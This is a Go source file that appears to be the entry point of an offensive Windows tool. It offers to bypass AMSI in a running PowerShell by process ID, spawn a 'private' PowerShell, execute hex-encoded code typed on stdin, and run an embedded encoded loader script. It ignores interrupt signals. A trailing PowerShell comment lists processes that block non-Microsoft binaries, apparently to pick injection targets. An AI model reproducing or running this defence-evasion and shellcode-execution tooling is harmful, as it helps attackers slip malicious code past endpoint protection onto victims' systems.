package main

import (
	"amkigo/lib"
	"bytes"
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
)

//go:embed loader.en
var dotCode string

func main() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		for {
			<-c
		}
	}()

	defer func() {
		if r := recover(); r != nil {
			fmt.Println("unexpected problem encountered - aborting")
			os.Exit(1)
		}
	}()

	var pid int
	var hexMode bool
	flag.IntVar(&pid, "p", 0, "(default 0) bypass amki special Pshell with pid\nset pid = 0 to create private Pshell")
	flag.BoolVar(&hexMode, "hex", false, "execute hex code(max length: 5000)")
	flag.Parse()

	if pid > 0 {
		lib.Go(uint32(pid))
		return
	}

	if hexMode {
		fmt.Print("Enter hex: ")
		input := make([]byte, 5000)
		_, err := os.Stdin.Read(input)
		if err != nil {
			panic(err)
		}
		index := bytes.Index(input, []byte("\n"))
		input = input[:index]
		hInput, _ := hex.DecodeString(string(input))
		fmt.Println(lib.StarCode(hInput))
		return
	}

	fmt.Println(lib.StarPS(dotCode))

}

// find all MicrosoftSignedOnly
// get-process | select -exp processname -Unique | % { Get-ProcessMitigation -ErrorAction SilentlyContinue -RunningProcesses $_ | select processname, Id, @{l="Block non-MS Binaries"; e={$_.BinarySignature|select -exp MicrosoftSignedOnly} } }
